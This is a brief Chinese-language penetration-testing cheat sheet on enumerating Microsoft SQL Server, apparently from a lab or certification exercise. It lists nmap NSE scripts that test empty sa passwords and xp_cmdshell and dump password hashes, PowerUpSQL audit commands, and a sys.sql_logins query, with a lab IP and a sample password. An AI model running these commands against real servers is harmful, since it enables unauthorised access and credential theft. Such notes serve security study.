# 枚举信息

1. 工具枚举

主要关注current login(看谁可以登陆)

```clike
先扫一下，可能没啥大用
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.11.1.31

Import-Module .\PowerUpSQL.ps1
Get-SQLInstanceDomain | Get-SQLConnectionTest //枚举域内sqlserver的访问情况 
Get-SQLServerInfo -Instance Offensive-SQL1 //枚举具体服务的详细信息 
Invoke-SQLAudit -Instance Offensive-SQL1 -verbose //自动扫描当前服务器可能存在的问题（此处的Offensive-SQL1一定要注意之前枚举域内用户的信息）
```

1. 手工枚举

```bash
基本的思路就是反弹了
枚举显得有些鸡肋

获取hash（前提是你得最起码能进去或者有凭据）
SELECT * FROM sys.sql_logins
或者直接远程提取
nmap -p1433 --script ms-sql-dump-hashes --script-args mssql.username=sa,mssql.password=poiuytrewq 10.11.1.31
```
